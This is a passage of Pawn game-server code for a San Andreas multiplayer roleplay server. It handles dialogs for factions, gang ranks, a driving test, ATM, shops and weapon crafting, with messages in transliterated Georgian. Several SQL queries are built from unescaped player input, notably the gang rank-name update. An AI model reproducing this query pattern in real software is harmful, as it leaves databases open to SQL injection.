				case 21: SetPlayerCheckpoint(playerid,875.805541,-1565.014892,13.533462,4.0); // ТИР ЛС
				case 22: SetPlayerCheckpoint(playerid,-2163.0466,129.2800,35.3203,4.0); // ТИР СФ
			}
			SetPVarInt(playerid,"GPS",1);
			SendClientMessage(playerid,0xFFFF00FF,"Adgili Moinishna Tqvens Rukaze.");
		}
		case dLeaderskin:
		{
			if(!response) return true;
			new fractionid = listitem, mes2[256];
			SetPVarInt(playerid,"actfraction",fractionid);
			for(new i;i<8;i++)
			{
				new skinid = gFractionSkin[fractionid][i];
				if(!skinid) break;
				if(!i) format(mes2,sizeof(mes2),"%d. Skin [{"#cGREEN"}№%d{ffffff}]",i+1,skinid);
				else format(mes2,sizeof(mes2),"%s\n%d. Skin [{"#cGREEN"}№%d{ffffff}]",mes2,i+1,skinid);
			}
			new actplayerid = GetPVarInt(playerid,"actplayerid");
			ShowPlayerDialog(playerid,dMakeleader,2,Name2(actplayerid),mes2,"OK","CLOSE");
		}
		case dMakeleader:
		{
			if(!response) return true;
			new fractionid = GetPVarInt(playerid,"actfraction");
			new skinid = gFractionSkin[fractionid][listitem];
			new rank = gFractionRankCount[fractionid];
			new actplayerid = GetPVarInt(playerid,"actplayerid");
			new query[180];
			format(query,sizeof(query),"UPDATE `members` SET `fraction` = '%d', rank = '%d', `fractionskin` = '%d', `subfraction` = '0' WHERE `nickname` = '%s'",fractionid+1,rank,skinid,Name2(actplayerid));
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 1 (Lideris Danishvnisas)");
			pData[actplayerid][pFraction] = fractionid+1;
			pData[actplayerid][pRank] = rank;
			pData[actplayerid][pFractionSkin] = skinid;
			pData[actplayerid][pSubfraction] = 0;
			pData[actplayerid][pJob] = 0;
			SetPlayerColor(actplayerid,gFractionColor[fractionid]);
			format(mes,sizeof(mes),"%s {"#cWHITE"}Danishnet Liderad: {"#cINFO"}\"%s\"",Name2(actplayerid),gFractionName[fractionid]);
			SendClientMessage(playerid,CYELLOW,mes);
			format(mes,sizeof(mes),"Tqven Danishnet Liderad: \"%s\"",gFractionName[fractionid]);
			SendClientMessage(actplayerid,CINFO,mes);
			new houseid = pData[actplayerid][pHouse]-1;
			if(!(houseid+1) || ((houseid+1) > 0 && !GetString(Name2(actplayerid),gHouses[houseid][houseOwner]))) SetPlayerSkin(actplayerid,skinid);
			else if(!gHouses[houseid][houseImprove][1]) SetPlayerSkin(actplayerid,skinid);
			else
			{
				if(GetPlayerSkin(actplayerid) == gHouses[houseid][houseSkin][3]) SetPlayerSkin(actplayerid,skinid);
				gHouses[houseid][houseSkin][3] = skinid;
				UpdateHouseDress(houseid);
				SendClientMessage(actplayerid,CINFO,"Organizaciis Tansacmeli Sheinaxa Tqvens Karadashi.");
			}
		}
		case dInvite:
		{
			if(!response) return true;
			new fractionid = pTemp[playerid][pOfferFractionid];
			new offer = pTemp[playerid][pOfferFraction], mes2[256];
			if(!IsPlayerConnected(offer) || pData[offer][pFraction] != fractionid+1 || !IsAbleToHire(offer)) return SendClientMessage(playerid,CGRAY,"Lideri Gavida Tamashidan");
			for(new i;i<8;i++)
			{
				new skinid = gFractionSkin[fractionid][i];
				if(!skinid) break;
				if(!i) format(mes2,sizeof(mes2),"%d. Skin [{"#cGREEN"}№%d{ffffff}]",i+1,skinid);
				else format(mes2,sizeof(mes2),"%s\n%d. Skin [{"#cGREEN"}№%d{ffffff}]",mes2,i+1,skinid);
			}
			SendClientMessage(playerid,CINFO,"Daelodet, Lideri Archevs Tansacmels Tqventvis");
			ShowPlayerDialog(offer,dInviteSkin,2,Name2(playerid),mes2,"Migeba","");
		}
		case dInviteSkin:
		{
			new actplayerid = GetPVarInt(playerid,"actinplayerid");
			new fractionid = pTemp[actplayerid][pOfferFractionid];
			new skinid = gFractionSkin[fractionid][listitem];
			if(pData[playerid][pFraction] != fractionid+1) return SendClientMessage(playerid,CGRAY,"Shecdoma #001");
			pData[actplayerid][pFraction] = fractionid+1;
			pData[actplayerid][pRank] = 1;
			pData[actplayerid][pFractionSkin] = skinid;
			pData[actplayerid][pSubfraction] = pData[playerid][pSubfraction];
			pData[actplayerid][pJob] = 0;
			SetPlayerColor(actplayerid,gFractionColor[fractionid]);
			new query[256];
			format(query,sizeof(query),"UPDATE `members` SET `fraction` = '%d', rank = '1', `fractionskin` = '%d', `subfraction` = '%d', `job` = '0' WHERE `nickname` = '%s'",fractionid+1,skinid,pData[playerid][pSubfraction],Name2(actplayerid));
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 1 (Organizaciashi Migebisas)");
			UpdatePlayerData(actplayerid,"subfraction",pData[actplayerid][pSubfraction]);
			format(mes,sizeof(mes),"%s Tqven Migiges Organizaciashi \"%s\"",Name2(actplayerid),gFractionName[fractionid]);
			SendClientMessage(playerid,CINFO,mes);
			print(mes);
			format(mes,sizeof(mes),"Tqven Ar Migiges Organizaciashi \"%s\"",gFractionName[fractionid]);
			SendClientMessage(actplayerid,CINFO,mes);
			new houseid = pData[actplayerid][pHouse]-1;
			if(!(houseid+1) || ((houseid+1) > 0 && !GetString(Name2(actplayerid),gHouses[houseid][houseOwner]))) SetPlayerSkin(actplayerid,skinid);
			else if(!gHouses[houseid][houseImprove][1]) SetPlayerSkin(actplayerid,skinid);
			else
			{
				if(GetPlayerSkin(actplayerid) == gHouses[houseid][houseSkin][3]) SetPlayerSkin(actplayerid,skinid);
				gHouses[houseid][houseSkin][3] = skinid;
				UpdateHouseDress(houseid);
				SendClientMessage(actplayerid,CINFO,"Organizaciis Tansacmeli Sheinaxa Tqvens Karadashi.");
			}
		}
		case dSetRank:
		{
			if(!response) return true;
			new actplayerid = GetPVarInt(playerid,"actgrplayerid");
			new fractionid = pData[playerid][pFraction] - 1;
			if(!IsPlayerConnected(playerid)) return true;
			new rank = listitem+1;
			new action[16];
			if(rank == pData[actplayerid][pRank]) return true;
			else if(rank < pData[actplayerid][pRank]) action = "Sheamcira";
			else action = "Gazarda";
			UpdatePlayerData(actplayerid,"rank",rank);
			pData[actplayerid][pRank] = rank;
			format(mes,sizeof(mes),"Tqven %s %s Miecit Ranki: \"%s\"",action,Name2(actplayerid),gFractionRankName[fractionid][rank-1]);
			SendClientMessage(playerid,CINFO,mes);
			format(mes,sizeof(mes),"%s %s Mogcat Ranki: \"%s\"",Name2(playerid),action,gFractionRankName[fractionid][rank-1]);
			SendClientMessage(actplayerid,CINFO,mes);
		}
		case dFractionSkin:
		{
			if(!response) return true;
			new actplayerid = GetPVarInt(playerid,"actplayerid");
			if(!IsPlayerConnected(actplayerid) || pData[actplayerid][pFraction] != pData[playerid][pFraction]) return true;
			new fractionid = pData[actplayerid][pFraction]-1;
			new skinid = gFractionSkin[fractionid][listitem];
			if(skinid == pData[actplayerid][pFractionSkin]) return true;
			format(mes,sizeof(mes),"%s Tqven Gadmogecat Axali Organizaciis Tansacmeli",Name2(playerid));
			SendClientMessage(actplayerid,CINFO,mes);
			format(mes,sizeof(mes),"%s Gadaecit Axali Organizaciis Tansacmeli",Name2(actplayerid));
			SendClientMessage(playerid,CINFO,mes);
			UpdatePlayerData(actplayerid,"fractionskin",skinid);
			pData[actplayerid][pFractionSkin] = skinid;
			new houseid = pData[actplayerid][pHouse]-1;
			if(!(houseid+1) || ((houseid+1) > 0 && !GetString(Name2(actplayerid),gHouses[houseid][houseOwner]))) SetPlayerSkin(actplayerid,skinid);
			else if(!gHouses[houseid][houseImprove][1]) SetPlayerSkin(actplayerid,skinid);
			else
			{
				if(GetPlayerSkin(actplayerid) == gHouses[houseid][houseSkin][3]) SetPlayerSkin(actplayerid,skinid);
				gHouses[houseid][houseSkin][3] = skinid;
				UpdateHouseDress(houseid);
				SendClientMessage(actplayerid,CINFO,"Organizaciis Tansacmeli Sheinaxa Tqvens Karadashi.");
			}
		}
		case dExamType:
		{
			if(!response) return true;
			switch(listitem)
			{
				case 0:
				{
					if(pData[playerid][pLicenses][LIC_DRIVING]) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Gaqvt Martvis Mowmoba.");
                    if(GetPlayerMoneyEx(playerid) < 150) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
					ShowPlayerDialog(playerid,dAutoExam1,0,"Avtoskola","{"#cINFO"}\t\t\t\t\t\tAvtoskola\n\n{"#cWHITE"}Mogesalmebit Avtoskolashi. Martvis Mowmobis Asagebad Sachiroa\n1. Waikitxet Da Iswavlet PDD\n2. Chaabaret Testi PDD\n3. Chaabaret Praqtikuli Gamocda","Shemdeg","Gamosvla");
				}
			}
		}
		case dAutoExam1:
		{
			if(!response) return true;
			ShowPlayerDialog(playerid,dAutoExam2,0,"Avtoskola","Mzad Xart?","Gagrdzeleba","Daxurva");
		}
		case dAutoExam2:
		{
			if(!response) return true;
			SetPVarInt(playerid,"examen",2);
			SendClientMessage(playerid,CGRAY,"Shedit Bibliotekashi Iswavlet PDD, Shemdeg Shedit Meore Otaxshi Da Chaabaret Teoriuli Gamocda.");
			//ShowPlayerDialog(playerid,dAutoExam3,0,"Школа вождения","{"#cWHITE"}Сейчас Вам будет предложено пройти тест.\nЧтобы получить доступ к практическому экзамену","Далее","Отмена");
		}
		case dAutoExam3:
		{
			if(!response) return true;
			ShowTestQuestion(playerid,0,3,dAutoTest1);
		}
		case dAutoTest1:
		{
			if(!response) return true;
			new q = pTemp[playerid][pTestQNumber];
			if(!listitem) return ShowTestQuestion(playerid,5,7,dAutoTest1,q);
			if(listitem != gExamTrueAnswer[q]) return SendClientMessage(playerid,CBADINFO,"Samwuxarod, Tqven Upasuxet Arasworad. Gamocda Ver Chaabaret");
			ShowTestQuestion(playerid,5,7,dAutoTest2);
		}
		case dAutoTest2:
		{
			if(!response) return true;
			new q = pTemp[playerid][pTestQNumber];
			if(!listitem) return ShowTestQuestion(playerid,9,11,dAutoTest2,q);
			if(listitem != gExamTrueAnswer[q]) return SendClientMessage(playerid,CBADINFO,"Samwuxarod, Tqven Upasuxet Arasworad. Gamocda Ver Chaabaret");
			ShowTestQuestion(playerid,9,11,dAutoTest3);
		}
		case dAutoTest3:
		{
			if(!response) return true;
			new q = pTemp[playerid][pTestQNumber];
			if(!listitem) return ShowTestQuestion(playerid,13,15,dAutoTest3,q);
			if(listitem != gExamTrueAnswer[q]) return SendClientMessage(playerid,CBADINFO,"Samwuxarod, Tqven Upasuxet Arasworad. Gamocda Ver Chaabaret");
			ShowTestQuestion(playerid,13,15,dAutoTest4);
		}
		case dAutoTest4:
		{
			if(!response) return true;
			new q = pTemp[playerid][pTestQNumber];
			if(!listitem) return ShowTestQuestion(playerid,19,20,dAutoTest4,q);
			if(listitem != gExamTrueAnswer[q]) return SendClientMessage(playerid,CBADINFO,"Samwuxarod, Tqven Upasuxet Arasworad. Gamocda Ver Chaabaret");
			ShowTestQuestion(playerid,19,20,dAutoTest5);
		}
		case dAutoTest5:
		{
			if(!response) return true;
			new q = pTemp[playerid][pTestQNumber];
			if(!listitem) return ShowTestQuestion(playerid,18,17,dAutoTest5,q);
			if(listitem != gExamTrueAnswer[q]) return SendClientMessage(playerid,CBADINFO,"Samwuxarod, Tqven Upasuxet Arasworad. Gamocda Ver Chaabaret");
			SendClientMessage(playerid,CGREEN,"Gilocavt, Testi Chabarebulia. Exla Gadit Shenobidan Da Chajeqit Avtoskolis Avtomobilshi.");
			SetPVarInt(playerid,"testcar1",1);
		}
		case dHeal:
		{
			new price = GetPVarInt(playerid,"healprice");
			new doctorid = GetPVarInt(playerid,"doctorid");
			if(!response) return SendClientMessage(doctorid,CGRAY,"Pacientma Uari Tqva Mkurnalobaze.");
			if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
			SetPlayerHealthEx(playerid,100.0);
			TransferMoney(playerid,doctorid,price);
			SendClientMessage(doctorid,CGREEN,"Pacienti Datanxmda Mkurnalobas.");
		}
		case dReport:
		{
			if(!response) return true;
			if(!strlen(inputtext)) return SendClientMessage(playerid,CGRAY,"Tqven Ar Shesulxart");
			if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Tqven Gadevt Mute");
			if(GetPVarInt(playerid,"NotReport") > gettime()) return SendClientMessage(playerid,CGRAY,"Reportis Gagzavna Sheidzleba Mxolod 1 Wutshi 1-Xel.");
			SetPVarInt(playerid,"NotReport",gettime()+60);
			format(mes,sizeof(mes),"Kitxva / Sachivari %s[%d]: {FFFFFF}%s",Name2(playerid),playerid,inputtext);
			if(pData[playerid][pAdmin] < 1) SendClientMessage(playerid,0xFFBF00FF,mes);
			AdminChat(0xFFBF00FF,mes);
		}
		case dATMWatch: ShowPlayerDialog(playerid,dBank,2,"{"#cYELLOW"}Sabanko Momsaxureba","1. Balansi\n2. Tanxis Gamotana\n3. Tanxis Shetana\n4. Saxelmwifo Gadasaxadebi\n5. Biznesis Gadasaxadebi","Archeva","Uaryofa");
		case dATMGet:
		{
			if(!response) return true;
			new amount = strval(inputtext);
			if(amount < 1 || amount > 5000000) return SendClientMessage(playerid,CGRAY,"Gamotanis Limita $1-Dan $5000000-Mde");
			if(pData[playerid][pBank] < amount) return SendClientMessage(playerid,CGRAY,"Tqven Balansze Ar Gaqvt Sakmarisi Tanxa");
			pData[playerid][pBank] -= amount;
			UpdatePlayerData(playerid,"bank",pData[playerid][pBank]);
			TransferMoney(-1,playerid,amount);
			SendClientMessage(playerid,CGREEN,"Tqven Aiget Tanxa Angarishidan");
		}
		case dATMPut:
		{
			if(!response) return true;
			new amount = strval(inputtext);
			if(amount < 1 || amount > 5000000) return SendClientMessage(playerid,CGRAY,"Shetanis Limitia $1-Dan $5000000-Mde");
			if(GetPlayerMoneyEx(playerid) < amount) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa Xelze");
			pData[playerid][pBank] += amount;
			UpdatePlayerData(playerid,"bank",pData[playerid][pBank]);
			TransferMoney(playerid,-1,amount);
			SendClientMessage(playerid,CGREEN,"Tqven Sheitanet Tanxa Bankis Angarishze");
		}
		case dShop:
		{
			if(!response) return true;
			new id = pTemp[playerid][pSelectedBusinessID];
			if(id < 0) return true;
			switch(listitem)
			{
				case 0:
				{
					new price = gShopProduct[0];
					if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
					if(gShopProduct[0] > gBusiness[id][busiProduct]) return SendClientMessage(playerid,CGRAY,"Am Magaziashi Agar Darcha Produqti");
					ShowPlayerDialog(playerid,dShopSim,1,"Nomris Yidva","{ffffff}Miutitet Nomeri, Romelic Gsurt Aigot (6 Cifri):","NEXT","CLOSE");
				}
				case 1:
				{
					new price = gShopProduct[1];
					if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
					if(gShopProduct[1] > gBusiness[id][busiProduct]) return SendClientMessage(playerid,CGRAY,"Am Magaziashi Agar Darcha Produqti");
					gBusiness[id][busiProduct] -= gShopProduct[1];
					gBusiness[id][busiBank] += price;
					UpdateBusinessDataEx(id+1,"product",gBusiness[id][busiProduct],"bank",gBusiness[id][busiBank]);
					UpdateBusinessText(id);
					TransferMoney(playerid,-1,price);
					GivePlayerWeaponEx(playerid,5,1);
					SendClientMessage(playerid,CGREEN,"Tqven Iyidet Beisbolis Bita.");
				}
				case 2:
				{
					if(pData[playerid][pWatch]) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Gaqvt Saati.");
					new price = gShopProduct[2];
					if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
					if(gShopProduct[2] > gBusiness[id][busiProduct]) return SendClientMessage(playerid,CGRAY,"Am Magaziashi Agar Darcha Produqti");
					gBusiness[id][busiProduct] -= gShopProduct[2];
					gBusiness[id][busiBank] += price;
					UpdateBusinessDataEx(id+1,"product",gBusiness[id][busiProduct],"bank",gBusiness[id][busiBank]);
					UpdateBusinessText(id);
					TransferMoney(playerid,-1,price);
					pData[playerid][pWatch] = 1;
					UpdatePlayerData(playerid,"watch",1);
					SendClientMessage(playerid,CGREEN,"Tqven Iyidet Saati. /time - Drois Naxva");
				}
				case 3:
				{
					new price = gShopProduct[3];
					if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
					if(gShopProduct[3] > gBusiness[id][busiProduct]) return SendClientMessage(playerid,CGRAY,"Am Magaziashi Agar Darcha Produqti");
					gBusiness[id][busiProduct] -= gShopProduct[3];
					gBusiness[id][busiBank] += price;
					UpdateBusinessDataEx(id+1,"product",gBusiness[id][busiProduct],"bank",gBusiness[id][busiBank]);
					UpdateBusinessText(id);
					TransferMoney(playerid,-1,price);
					GivePlayerWeaponEx(playerid,14,1);
					SendClientMessage(playerid,CGREEN,"Tqven Iyidet Yvavilebi.");
				}
				case 4:
				{
					new price = gShopProduct[4];
					if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
					if(gShopProduct[4] > gBusiness[id][busiProduct]) return SendClientMessage(playerid,CGRAY,"Am Magaziashi Agar Darcha Produqti");
					gBusiness[id][busiProduct] -= gShopProduct[4];
					gBusiness[id][busiBank] += price;
					UpdateBusinessDataEx(id+1,"product",gBusiness[id][busiProduct],"bank",gBusiness[id][busiBank]);
					UpdateBusinessText(id);
					TransferMoney(playerid,-1,price);
					GivePlayerWeaponEx(playerid,43,15);
					SendClientMessage(playerid,CGREEN,"Tqven Iyidet Kamera. (15 Surati)");
				}
				case 5:
				{
					new price = gShopProduct[5];
					if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa");
					if(gShopProduct[5] > gBusiness[id][busiProduct]) return SendClientMessage(playerid,CGRAY,"Am Magaziashi Agar Darcha Produqti");
					gBusiness[id][busiProduct] -= gShopProduct[5];
					gBusiness[id][busiBank] += price;
					UpdateBusinessDataEx(id+1,"product",gBusiness[id][busiProduct],"bank",gBusiness[id][busiBank]);
					UpdateBusinessText(id);
					TransferMoney(playerid,-1,price);
					GivePlayerWeaponEx(playerid,42,50);
					SendClientMessage(playerid,CGREEN,"Tqven Iyidet Cecxlmaqri.");
				}
				case 6:
				{
				    new price = gShopProduct[6];
					if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
					if(gShopProduct[6] > gBusiness[id][busiProduct]) return SendClientMessage(playerid,CGRAY,"Am Magaziashi Agar Darcha Produqti");
                    SetPVarInt(playerid,"maska",1);
                    gBusiness[id][busiProduct] -= gShopProduct[6];
					gBusiness[id][busiBank] += price;
					UpdateBusinessDataEx(id+1,"product",gBusiness[id][busiProduct],"bank",gBusiness[id][busiBank]);
					UpdateBusinessText(id);
					TransferMoney(playerid,-1,price);
					SendClientMessage(playerid,CGREEN,"Tqven Iyidet Maska. Mis Gasaketeblad Gamoiyenet {FFCC00}/mask");
				}
			}
		}
		case dShopSim:
		{
		    if(!response) return true;
		    if(!isNumeric(inputtext) || strlen(inputtext) != 6 || inputtext[0] == '0')
			{
				SendClientMessage(playerid,CGRAY,"Nomeri Unda Sheicavdes {"#cWHITE"}6 {"#cGRAY"}Cifrs. Pirveli Cifri Ar Sheidzleba Iyos {"#cWHITE"}\"Nuli\"");
				ShowPlayerDialog(playerid,dShopSim,1,"Nomris Yidva","{ffffff}Miutitet Nomeri, Romelic Gsurt (6 Cifri):","NEXT","CLOSE");
				return true;
			}
			new query[128], id = pTemp[playerid][pSelectedBusinessID], price = gShopProduct[0]*gBusiness[id][busiPrice];
			format(query,sizeof(query),"SELECT `id` FROM `members` WHERE `phone` = '%s'",inputtext);
			mysql_tquery(mysql, query, "mysql_dShop", "dddd", playerid, strval(inputtext), id, price);
		}
		case dBuyFood:
		{
			if(!response) return true;
			new sel = listitem;
			new id = pTemp[playerid][pSelectedBusinessID];
			new price = gEateryCosts[sel] * gBusiness[id][busiPrice];
			if(id < 0) return true;
			new money = GetPlayerMoneyEx(playerid);
			if(!money) return SendClientMessage(playerid,CGRAY,"Samwuxarod, Tqven Ar Gaqvt Fuli Sakvebistvis");
			if(money < price)
			{
				SetPVarInt(playerid,"eatprice",money);
				SPFD(playerid,dBuyFood,0,"Sauzme","YES","NO","{"#cWHITE"}tqven Gaqvt Sakmarisi Fuli Sakvebistvis");
				return true;
			}
			new amount = gEateryCosts[sel];
			if(amount > gBusiness[id][busiProduct]) return SendClientMessage(playerid,CGRAY,"Samwuxarod, Sakvebi Am Sasadiloshi Sul Shechames");
			gBusiness[id][busiProduct] -= amount;
			TransferMoney(playerid,-1,price);
			gBusiness[id][busiBank] += price;
			UpdateBusinessDataEx(id+1,"product",gBusiness[id][busiProduct],"bank",gBusiness[id][busiBank]);
			UpdateBusinessText(id);
			SendClientMessage(playerid, -1, "Shedzenili Produqti Daemateba Inventars.");
			if(listitem == 2) pTemp[playerid][pEda][8] += 1;
			else pTemp[playerid][pEda][sel] += 1;
			updateEda(playerid);
			SaveEda(playerid);
		}
		case dGangLeader:
		{
			if(!response) return true;
			new fractionid = pData[playerid][pFraction] - 1;
			switch(listitem)
			{
				case 0:
				{
				    new mes2[500];
					for(new i;i<10;i++)
					{
						format(mes2,sizeof(mes2),"%s%d.%s\n",mes2,i+1,gFractionRankName[fractionid][i]);
					}
					ShowPlayerDialog(playerid,dGangRank,2,"Airchiet Ranki",mes2,"Shecvla","Gamosvla");
				}
				case 1:
				{
					new rankid1 = gGangAccess[fractionid-2][0]-1;
					new rankid2 = gGangAccess[fractionid-2][1]-1;
					new rankid3 = gGangAccess[fractionid-2][2]-1;
					new rankid4 = gGangAccess[fractionid-2][3]-1;
					format(mes,sizeof(mes),"1. Xelmisawvdomi Saerto Tanxebi [{"#cGREEN"}%s{"#cWHITE"}]\n2. Miigos Fraqciam [{"#cGREEN"}%s{"#cWHITE"}]\n3. Gadaayenos Fraqciidan [{"#cGREEN"}%s{"#cWHITE"}]\n4. Motamashis Rankis Shecvla [{"#cGREEN"}%s{"#cWHITE"}]",gFractionRankName[fractionid][rankid1],gFractionRankName[fractionid][rankid2],gFractionRankName[fractionid][rankid3],gFractionRankName[fractionid][rankid4]);
					ShowPlayerDialog(playerid,dCredentials,2,"Airchie.",mes,"Shecvla","Daxurva");
				}
				case 2:
				{
				    if(pData[playerid][pFraction] >= 3 && pData[playerid][pFraction] <= 7 && pData[playerid][pRank] == 10)
					{
						new mes2[512];
						for(new i;i<15;i++)
						{
							new model = gGangCarModelID[i];
							new modelid = model - 400;
							if(!i) format(mes2,sizeof(mes2),"%s [{"#cRED"}$%d{"#cWHITE"}]",gTransport[modelid][trName],gTransport[modelid][trPrice]);
							else format(mes2,sizeof(mes2),"%s\n%s [{"#cRED"}$%d{"#cWHITE"}]",mes2,gTransport[modelid][trName],gTransport[modelid][trPrice]);
						}
						ShowPlayerDialog(playerid,dBuyGangCar,2,"Iyidet Bandis Avtomobili",mes2,"Yidva","Daxurva");
					}
				}
				case 3:
				{
					if(pData[playerid][pFraction] >= 3 && pData[playerid][pFraction] <= 7 && pData[playerid][pRank] == 10)
					{
						new gangid = pData[playerid][pFraction]-3;
						new mes2[512];
						for(new i;i<5;i++)
						{
							if(!gGangCars[gangid][i] || gGangCars[gangid][i] == 481) format(mes2,sizeof(mes2),"%s%d Sufta\n",mes2,i+1);
							else
							{
								new modelid = gGangCars[gangid][i] - 400;
								format(mes2,sizeof(mes2),"%s%d %s [{"#cGREEN"}$%d{"#cWHITE"}]\n",mes2,i+1,gTransport[modelid][trName],floatround(gTransport[modelid][trPrice]*0.2));
							}
						}
						ShowPlayerDialog(playerid,dSellGangCar,2,"Gayidet Bandis Avtomobili",mes2,"Gayidva","Daxurva");
					}
				}
			}
		}
		case dGangRank:
		{

			if(!response) return true;
			new fractionid = pData[playerid][pFraction] - 1;
			SetPVarInt(playerid,"selectedrank",listitem+1);
			SPFD(playerid,dGangRank2,1,"Rankebis Saxelebi","Shecvla","Daxurva","{"#cWHITE"}Daweret Rankis Axali Dasaxeleba '%s [%d]'",gFractionRankName[fractionid][listitem],listitem+1);
		}
		case dGangRank2:
		{
			if(!response) return true;
			new fractionid = pData[playerid][pFraction] - 1;
			new rankid = GetPVarInt(playerid,"selectedrank") - 1;
			if(rankid < 0) return true;
			if(strlen(inputtext) < 1 || strlen(inputtext) > 20)
			{
				SendClientMessage(playerid,CGRAY,"Rankis Saxeli Unda Sheicavdes 1-Dan 20-Mde Simbolos");
				SPFD(playerid,dGangRank2,1,"Rankebis Saxelebi","Shecvla","Daxurva","{"#cWHITE"}Daweret Rankis Axali Dasaxeleba '%s [%d]'",gFractionRankName[fractionid][rankid],rankid+1);
			}
			if(strfind(inputtext,"|") != -1) return SendClientMessage(playerid,CGRAY,"Akrdzaluli Simboloebi");
			format(gFractionRankName[fractionid][rankid],24,"%s",inputtext);
			new query[280],data[220];
			for(new i;i<10;i++)
			{
				if(!i) format(data,sizeof(data),"%s",gFractionRankName[fractionid][i]);
				else format(data,sizeof(data),"%s,%s",data,gFractionRankName[fractionid][i]);
			}
			format(query,sizeof(query),"UPDATE `gangs` SET `ranks` = '%s' WHERE `id` = '%d'",data,fractionid-1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL (Rankebis Shecvlisas)");
			SendClientMessage(playerid,CGREEN,"Tqven Shecvalet Rankis Dasaxeleba");
			for(new i;i<10;i++)
			{
				format(mes,sizeof(mes),"%s%d.%s\n",mes,i+1,gFractionRankName[fractionid][i]);
			}
			ShowPlayerDialog(playerid,dGangRank,2,"Airchiet Ranki",mes,"Shecvla","Daxurva");
		}
		case dCredentials:
		{
			if(!response) return true;
			new fractionid = pData[playerid][pFraction] - 1, mes2[200];
			SetPVarInt(playerid,"credentialid",listitem);
			for(new i;i<10;i++)
			{
				if(i+1 < gGangAccess[fractionid-2][listitem]) format(mes2,sizeof(mes2),"%s%d.%s\n",mes2,i+1,gFractionRankName[fractionid][i]);
				else format(mes2,sizeof(mes2),"%s{"#cGREEN"}%d.%s\n",mes2,i+1,gFractionRankName[fractionid][i]);
			}
			ShowPlayerDialog(playerid,dCredentials2,2,"Airchiet Minimaluri Ranki",mes2,"Shecvla","Daxurva");
		}
		case dCredentials2:
		{
			if(!response) return true;
			new fractionid = pData[playerid][pFraction] - 1;
			new credentialid = GetPVarInt(playerid,"credentialid");
			new field[24];
			switch(credentialid)
			{
				case 0: field = "dorma";
				case 1: field = "invite";
				case 2: field = "uninvite";
				case 3: field = "giverank";
			}
			new rankid = listitem;
			new query[128];
			format(query,sizeof(query),"UPDATE `gangs` SET `%s` = '%d' WHERE `id` = '%d'",field,rankid+1,fractionid-1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CGRAY,"Shecdoma MySQL (Xelisuflebis Cvlileba)");
			gGangAccess[fractionid-2][credentialid] = rankid + 1;
			SendClientMessage(playerid,CGREEN,"Xelisufleba Sheicvala");
			new rankid1 = gGangAccess[fractionid-2][0]-1;
			new rankid2 = gGangAccess[fractionid-2][1]-1;
			new rankid3 = gGangAccess[fractionid-2][2]-1;
			new rankid4 = gGangAccess[fractionid-2][3]-1;
			format(mes,sizeof(mes),"1. Xelmisawvdomi Saerto Tanxebi [{"#cGREEN"}%s{"#cWHITE"}]\n2. Miigos Fraqciam [{"#cGREEN"}%s{"#cWHITE"}]\n3. Gadaayenos Fraqciidan [{"#cGREEN"}%s{"#cWHITE"}]\n4. Motamashis Rankis Shecvla [{"#cGREEN"}%s{"#cWHITE"}]",gFractionRankName[fractionid][rankid1],gFractionRankName[fractionid][rankid2],gFractionRankName[fractionid][rankid3],gFractionRankName[fractionid][rankid4]);
			ShowPlayerDialog(playerid,dCredentials,2,"Airchie.",mes,"Shecvla","Daxurva");
		}
		case dMakeGun:
		{
			if(!response) return true;
			SetPVarInt(playerid,"makegunid",listitem);
			new needgun = gGunAmount[listitem];
			new bool:noneedgun;
			SetPVarInt(playerid,"noneedgun",0);
			for(new i;i<12;i++)
			{
				new weapid,ammot;
				GetPlayerWeaponData(playerid,i,weapid,ammot);
				if(weapid == gGunID[listitem]) {noneedgun = true; SetPVarInt(playerid,"noneedgun",1); break;}
			}
			if(pData[playerid][pGunAmount] < needgun && !noneedgun)
			{
				SFCM(playerid,CGRAY,"Tqven Gchirdebat %d Metali Rom Daamzadot Es Iaragi",needgun);
				ShowMakeGunList(playerid);
				return true;
			}
			ShowPlayerDialog(playerid,dMakeGun2,1,"Iaragis Damzadeba","{"#cWHITE"}Ramdeni tyvia Gsurt Gamoiyenot Am Iaragistvis?","OK","CLOSE");
		}
		case dMakeGun2:
		{
			if(!response) return true;
			new ammo = strval(inputtext);
			if(ammo < 1 || ammo > 500)
			{
				SendClientMessage(playerid,CGRAY,"Araswori Tyviebis Raodenoba");
				ShowMakeGunList(playerid);
				return true;
			}
			new gunid = GetPVarInt(playerid,"makegunid");
			new needgun = gGunAmount[gunid];
			new weaponid = gGunID[gunid];
			if(pData[playerid][pAmmo] < ammo) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tyviebi.");
			if(!GetPVarInt(playerid,"noneedgun")) pData[playerid][pGunAmount] -= needgun;
			SetPVarInt(playerid,"noneedgun",0);
			pData[playerid][pAmmo] -= ammo;
			Pokaz(playerid,2,ammo,0);
			new query[180];
